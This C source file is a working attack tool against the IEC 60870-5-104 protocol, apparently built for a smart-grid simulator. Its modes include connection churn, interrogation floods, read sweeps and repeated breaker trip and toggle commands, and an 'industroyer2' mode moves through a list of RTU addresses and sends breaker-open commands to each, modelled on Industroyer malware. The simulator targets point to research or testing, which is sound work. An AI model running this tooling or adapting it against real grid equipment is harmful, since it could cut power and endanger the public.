/*
* attack_iec104_misuse.c
*/

#include "hal_time.h" // For sleep/timing
#include "hal_thread.h" // Thread sleep
#include "cs104_connection.h" 
#include "cs101_information_objects.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>

/* Global Run Flag*/
static volatile int keepRunning = 1;


static void onSigInt(int sig)
/* Handle SIGINT/SIGTERM for shutdown*/
{
    (void)sig; 
    keepRunning = 0;
}



static void usage(const char* prog)
// CLI
{
    printf("Usage:\n");
    printf("  %s <ip> [port] [mode] [rate_ms] [ioa_min] [ioa_max] [ca]\n", prog);
    printf("\n");
    printf("Modes:\n");
    printf("  conn_churn    - open/close connections repeatedly\n");
    printf("  start_stop    - STARTDT/STOPDT toggling on one connection\n");
    printf("  interrogate   - repeated interrogation commands\n");
    printf("  read_sweep    - repeated read commands over IOA range\n");
    printf("  single_cmd    - repeated C_SC_NA_1 ON/OFF toggle (Industroyer-style, IOA 5000)\n");
    printf("  breaker_trip  - repeated C_DC_NA_1 OPEN/CLOSE commands (Industroyer-2-style)\n");
    printf("  industroyer2  - multi-RTU sequential breaker attack (Industroyer-2 realistic)\n");
    printf("                  Accepts comma-separated IPs. Pivots RTU-by-RTU sequentially.\n");
    printf("\n");
    printf("Defaults:\n");
    printf("  port=2404, mode=read_sweep, rate_ms=250, ioa_min=1, ioa_max=50, ca=1\n");
    printf("\n");
    printf("SGSim targets:\n");
    printf("  DSS1RTU: 1.1.1.1:2404\n");
    printf("  DSS2RTU: 1.1.2.1:2404\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s 1.1.1.1 2404 single_cmd   1000 5000 5000 1\n", prog);
    printf("  %s 1.1.1.1 2404 breaker_trip 1000 5000 5000 1\n", prog);
    printf("  %s \"1.1.1.1,1.1.2.1\" 2404 industroyer2 3000 5000 5004 1\n", prog);
}

static void connectionHandler(void* parameter, CS104_Connection connection, CS104_ConnectionEvent event)
{
    (void)parameter;
    (void)connection;

    switch(event) {
    case CS104_CONNECTION_OPENED:
        printf("[*] Connection opened\n");
        break;
    case CS104_CONNECTION_CLOSED:
        printf("[*] Connection closed\n");
        break;
    case CS104_CONNECTION_STARTDT_CON_RECEIVED:
        printf("[*] STARTDT_CON received\n");
        break;
    case CS104_CONNECTION_STOPDT_CON_RECEIVED:
        printf("[*] STOPDT_CON received\n");
        break;
    default:
        break;
    }
}


static void run_conn_churn(const char* ip, uint16_t port, int rateMs)
{
    while (keepRunning) {
        CS104_Connection con = CS104_Connection_create(ip, port);
        CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

        if (CS104_Connection_connect(con)) {
            CS104_Connection_sendStartDT(con);

            Thread_sleep(rateMs);
            CS104_Connection_sendStopDT(con);
        }
        CS104_Connection_destroy(con);
        Thread_sleep(rateMs);
    }
}

static void run_start_stop(const char* ip, uint16_t port, int rateMs)
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if(!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    while (keepRunning) {
        CS104_Connection_sendStartDT(con);
        Thread_sleep(rateMs);

        CS104_Connection_sendStopDT(con);
        Thread_sleep(rateMs);
    }
    
    CS104_Connection_destroy(con);
}

static void run_interrogate(const char* ip, uint16_t port, int rateMs)
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    while(keepRunning) {
       CS104_Connection_sendInterrogationCommand(con, CS101_COT_ACTIVATION, 1, IEC60870_QOI_STATION);
       Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_read_sweep(const char* ip, uint16_t port, int rateMs, int ioaMin, int ioaMax)
{
    // Ensure min <= max
    if (ioaMin > ioaMax) {
        int tmp = ioaMin;
        ioaMin = ioaMax;
        ioaMax = tmp;
    }

    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    
    if(!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int ioa = ioaMin;

    
    while (keepRunning) {
 
        CS104_Connection_sendReadCommand(con, 1, ioa);

        // Move to the next IOA, wrap at end of range
        ioa++;
        if (ioa > ioaMax)
            ioa = ioaMin;

        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_single_cmd(const char* ip, uint16_t port, int rateMs, int ioa, int caAddr)
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int state = 1; /* toggle between ON(1) and OFF(0) */
    printf("[*] Starting single_cmd: ip=%s ioa=%d ca=%d rate_ms=%d\n", ip, ioa, caAddr, rateMs);

    while (keepRunning) {
        InformationObject sc = (InformationObject)
            SingleCommand_create(NULL, ioa, state, false, 0);

        printf("[>] C_SC_NA_1 %s -> IOA=%-5d CA=%d\n", state ? "ON " : "OFF", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_SC_NA_1, CS101_COT_ACTIVATION, caAddr, sc);
        InformationObject_destroy(sc);

        state = !state; 
        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_breaker_trip(const char* ip, uint16_t port, int rateMs, int ioa, int caAddr)
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    printf("[*] Starting breaker_trip: ip=%s ioa=%d ca=%d rate_ms=%d\n", ip, ioa, caAddr, rateMs);

    while (keepRunning) {

        InformationObject dc_open = (InformationObject)
            DoubleCommand_create(NULL, ioa, 1, false, 0);

        printf("[>] C_DC_NA_1 OPEN  (trip)  -> IOA=%-5d CA=%d\n", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION, caAddr, dc_open);
        InformationObject_destroy(dc_open);

        Thread_sleep(rateMs);
        if (!keepRunning) break;

        InformationObject dc_close = (InformationObject)
            DoubleCommand_create(NULL, ioa, 2, false, 0);

        printf("[>] C_DC_NA_1 CLOSE (reset) -> IOA=%-5d CA=%d\n", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION, caAddr, dc_close);
        InformationObject_destroy(dc_close);

        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

typedef struct {
    const char* ip;
    uint16_t port;
    int rateMs;
    int ioaMin;
    int ioaMax;
    int caAddr;
} target_params_t;

static int industroyer2_attack_rtu(const target_params_t* p)
{
    CS104_Connection con = CS104_Connection_create(p->ip, p->port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[RTU %s] Connect failed\n", p->ip);
        CS104_Connection_destroy(con);
        return -1;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int cmdCount = 0;
    for (int ioa = p->ioaMin; ioa <= p->ioaMax && keepRunning; ioa++) {
        InformationObject dc_open = (InformationObject)
            DoubleCommand_create(NULL, ioa, 1, false, 0);

        printf("[RTU %s] C_DC_NA_1 OPEN -> IOA=%d CA=%d\n", p->ip, ioa, p->caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION,
                                            p->caAddr, dc_open);
        InformationObject_destroy(dc_open);
        cmdCount++;

        Thread_sleep(p->rateMs);
    }

    CS104_Connection_destroy(con);
    return cmdCount;
}

static void run_industroyer2(const char* ipList, uint16_t port, int rateMs,
                              int ioaMin, int ioaMax, int caAddr)
{
#define MAX_TARGETS 64

    if (strlen(ipList) >= 1024) {
        printf("[!] IP list too long (max 1023 characters)\n");
        return;
    }

    /* Parse comma-separated IP list into array */
    char ipBuf[1024];
    strncpy(ipBuf, ipList, sizeof(ipBuf) - 1);
    ipBuf[sizeof(ipBuf) - 1] = '\0';

    /* Count and collect IPs*/
    const char* ips[MAX_TARGETS];
    int nTargets = 0;
    char* tok = strtok(ipBuf, ",");
    while (tok != NULL) {
        if (nTargets >= MAX_TARGETS) {
            printf("[!] Too many targets — only the first %d will be used\n", MAX_TARGETS);
            break;
        }
        ips[nTargets++] = tok;
        tok = strtok(NULL, ",");
    }

    if (nTargets == 0) {
        printf("[!] No target IPs specified\n");
        return;
    }

    printf("[*] industroyer2: targeting %d RTU(s), IOA %d-%d, rate=%dms, CA=%d\n",
           nTargets, ioaMin, ioaMax, rateMs, caAddr);

    int cmdsSent[MAX_TARGETS];
    int connected[MAX_TARGETS];
    for (int i = 0; i < MAX_TARGETS; i++) {
        cmdsSent[i]  = 0;
        connected[i] = 0;
    }
    for (int i = 0; i < nTargets && keepRunning; i++) {
        printf("[*] ---- Pivoting to RTU %d/%d: %s ----\n", i + 1, nTargets, ips[i]);

        target_params_t p;
        p.ip     = ips[i];
        p.port   = port;
        p.rateMs = rateMs;
        p.ioaMin = ioaMin;
        p.ioaMax = ioaMax;
        p.caAddr = caAddr;

        int result   = industroyer2_attack_rtu(&p);
        connected[i] = (result >= 0);
        cmdsSent[i]  = (result >= 0) ? result : 0;
    }

    printf("\n[*] ---- industroyer2 summary ----\n");
    for (int i = 0; i < nTargets; i++) {
        if (connected[i])
            printf("[*]   RTU %d/%d  %s  connected, %d command(s) sent\n",
                   i + 1, nTargets, ips[i], cmdsSent[i]);
        else
            printf("[*]   RTU %d/%d  %s  FAILED (no connection)\n",
                   i + 1, nTargets, ips[i]);
    }
    printf("[*] ----------------------------------\n");

#undef MAX_TARGETS
}

int main(int argc, char** argv)
{
    // Ensure ctrl+c stops the program
    signal(SIGINT, onSigInt);
    signal(SIGTERM, onSigInt);

    const char* ip   = (argc > 1) ? argv[1] : "127.0.0.1";
    uint16_t port    = (argc > 2) ? (uint16_t)atoi(argv[2]) : IEC_60870_5_104_DEFAULT_PORT;
    const char* mode = (argc > 3) ? argv[3] : "read_sweep";
    int rateMs       = (argc > 4) ? atoi(argv[4]) : 250;
    int ioaMin       = (argc > 5) ? atoi(argv[5]) : 1;
    int ioaMax       = (argc > 6) ? atoi(argv[6]) : 50;
    int caAddr       = (argc > 7) ? atoi(argv[7]) : 1;

    if (argc < 2) {
        usage(argv[0]);
        printf("\n[*] Using defaults: ip=%s port=%u mode=%s rate_ms=%d ioa=[%d..%d] ca=%d\n",
               ip, port, mode, rateMs, ioaMin, ioaMax, caAddr);
    } else {
        printf("[*] ip=%s port=%u mode=%s rate_ms=%d ioa=[%d..%d] ca=%d\n",
               ip, port, mode, rateMs, ioaMin, ioaMax, caAddr);
    }

    if      (strcmp(mode, "conn_churn")   == 0) run_conn_churn(ip, port, rateMs);
    else if (strcmp(mode, "start_stop")   == 0) run_start_stop(ip, port, rateMs);
    else if (strcmp(mode, "interrogate")  == 0) run_interrogate(ip, port, rateMs);
    else if (strcmp(mode, "read_sweep")   == 0) run_read_sweep(ip, port, rateMs, ioaMin, ioaMax);
    else if (strcmp(mode, "single_cmd")   == 0) run_single_cmd(ip, port, rateMs, ioaMin, caAddr);
    else if (strcmp(mode, "breaker_trip") == 0) run_breaker_trip(ip, port, rateMs, ioaMin, caAddr);
    else if (strcmp(mode, "industroyer2") == 0) run_industroyer2(ip, port, rateMs, ioaMin, ioaMax, caAddr);
    else {
        printf("[!] Unknown mode: %s\n", mode);
        usage(argv[0]);
        return 2;
    }
    
    printf("[*] Exit\n");
    return 0;
}
